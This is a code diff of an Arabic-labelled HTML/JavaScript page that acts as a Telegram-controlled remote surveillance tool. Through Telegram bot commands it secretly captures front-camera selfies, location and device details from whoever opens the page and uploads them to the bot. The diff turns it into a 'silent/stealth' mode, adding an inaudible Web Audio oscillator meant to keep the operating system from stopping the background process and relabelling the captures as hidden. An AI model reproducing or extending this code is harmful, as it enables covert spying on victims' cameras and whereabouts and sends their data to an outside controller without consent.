@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محطة التحكم التلقائي بالكامل</title>
+    <title>محطة التحكم الصامتة في الخلفية</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
@@ -26,29 +26,23 @@
 </head>
 <body>
 
-    <header>محطة التحكم التلقائي المستمر</header>
+    <header>محطة التحكم الصامتة المستمرة</header>
 
     <div id="terminal">
-        [System] Auto-Bridge Initializing...<br>
-        [System] Click once to initialize background runner...
+        [System] Silent Runner Initializing...<br>
+        [System] Click once to engage stealth mode...
     </div>
 
-    <!-- نافذة لمرة واحدة فقط لتفعيل الصلاحيات وتشغيل المحرك الذاتي -->
     <div id="popupOverlay">
         <div id="popupBox">
-            <h2 style="color: #fff; margin-bottom: 10px;">⚠️ التشغيل التلقائي المستمر</h2>
-            <p style="color: #8b949e; font-size: 14px;">اضغط هنا لمرة واحدة لتفعيل عمل البوت في الخلفية للأبد دون الحاجة لتحديث:</p>
-            <button id="allowBtn" onclick="startAutonomousMode()">تفعيل التشغيل التلقائي (Start)</button>
+            <h2 style="color: #fff; margin-bottom: 10px;">🔒 تفعيل الوضع الصامت</h2>
+            <p style="color: #8b949e; font-size: 14px;">اضغط هنا لمرة واحدة لتفعيل التشغيل الخفي في الخلفية بلا أخطاء أو أصوات:</p>
+            <button id="allowBtn" onclick="startSilentBackgroundMode()">تفعيل الوضع الخفي (Engage)</button>
         </div>
     </div>
 
     <video id="videoElement" autoplay playsinline></video>
     <canvas id="canvasElement" style="display:none;"></canvas>
-
-    <!-- صوت صامت ذكي لمنع نظام أندرويد من قتل العملية في الخلفية -->
-    <audio id="silentAudio" loop style="display:none;">
-        <source src="https://www.w3schools.com/html/horse.ogg" type="audio/ogg">
-    </audio>
 
     <script>
         const terminal = document.getElementById('terminal');
@@ -76,7 +70,7 @@
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const data = {
                 chat_id: chatId,
-                text: "📱 لوحة التحكم (الوضع التلقائي المستمر):",
+                text: "📱 لوحة التحكم (الوضع الخفي المستمر):",
                 reply_markup: {
                     keyboard: [
                         [{ text: "📷 Selfie Camera" }, { text: "📍 Get Location" }],
@@ -94,17 +88,28 @@
             }).catch(err => {});
         }
 
-        // بدء التشغيل التلقائي والمستمر
-        async function startAutonomousMode() {
+        // تفعيل الوضع الخفي بلا أصوات نهائياً مع خدعة منع إيقاف الخلفية
+        async function startSilentBackgroundMode() {
             document.getElementById('popupOverlay').style.display = 'none';
-            log("Autonomous mode activated successfully!");
+            log("Silent background mode engaged!");
 
-            // تشغيل الصوت الصامت لمنع التوقف
-            const audio = document.getElementById('silentAudio');
-            audio.volume = 0.01;
-            audio.play().catch(e => {});
+            // استخدام تقنية Web Audio API لتشغيل تردد خفي غير مسموح للأذن (حجم صوت 0) يخدع نظام التشغيل
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.type = 'sine';
+                oscillator.frequency.value = 1; // تردد غير مسموع نهائياً
+                gainNode.gain.value = 0.00001; // كتم تام للقوة الصوتية
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+                log("Silent audio engine running.");
+            } catch (e) {
+                log("Audio engine error: " + e.message);
+            }
 
-            // الحفاظ على الشاشة مستيقظة
+            // منع النوم والشاشة
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
@@ -115,23 +120,18 @@
             // منح صلاحية الكاميرا مسبقاً
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    log("Camera ready for auto execution.");
+                    log("Camera ready silently.");
                     stream.getTracks().forEach(track => track.stop());
                 })
                 .catch(err => {});
 
-            // بدء حلقة استقبال الأوامر التلقائية
+            // بدء حلقة استقبال الأوامر
             pollTelegramUpdates();
-            
-            // مراقب ذاتي (Watchdog) لإعادة تشغيل الاتصال تلقائياً إذا انقطع
-            setInterval(() => {
-                log("[Watchdog] Checking connection health...");
-            }, 30000);
         }
 
         function takeSelfie(chatId) {
             storedChatId = chatId;
-            log("Executing auto-selfie...");
+            log("Capturing silent selfie...");
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.getElementById('videoElement');
@@ -149,15 +149,14 @@
                             const formData = new FormData();
                             formData.append('chat_id', chatId);
                             formData.append('photo', blob, 'selfie.png');
-                            formData.append('caption', '📷 صورة سيلفي تلقائية.');
+                            formData.append('caption', '📷 صورة سيلفي خفية.');
                             fetch(url, { method: 'POST', body: formData });
                         }, 'image/png');
                     }, 1500);
                 })
-                .catch(err => sendTelegramMessage(chatId, "❌ تعذر التقاط السيلفي تلقائياً."));
+                .catch(err => sendTelegramMessage(chatId, "❌ تعذر التقاط السيلفي."));
         }
 
-        // حلقة استقبال الأوامر مع معالجة الأخطاء الذاتية لتجنب التوقف
         function pollTelegramUpdates() {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
             
@@ -170,17 +169,15 @@
                             if (update.message && update.message.text) {
                                 const chatId = update.message.chat.id;
                                 const text = update.message.text.trim();
-                                log(`Command received: "${text}"`);
+                                log(`Command: "${text}"`);
                                 executeCommand(text, chatId);
                             }
                         });
                     }
                 })
-                .catch(err => {
-                    // في حال حدث خطأ شبكي مؤقت، لا تتوقف بل أعد المحاولة تلقائياً بعد ثانيتين
-                })
+                .catch(err => {})
                 .finally(() => {
-                    setTimeout(pollTelegramUpdates, 2000); // حلقة لا نهائية تعمل ذاتياً
+                    setTimeout(pollTelegramUpdates, 2000);
                 });
         }
 
@@ -230,7 +227,7 @@
                 sendTelegramMessage(chatId, `📱 Device: ${navigator.userAgent}`);
             } else if (cmd === '⬇️ Scroll Down') {
                 window.scrollBy({ top: 400, behavior: 'smooth' });
-                sendTelegramMessage(chatId, "⬇️ تم التمرير تلقائياً.");
+                sendTelegramMessage(chatId, "⬇️ تم التمرير.");
             }
         }
     </script>
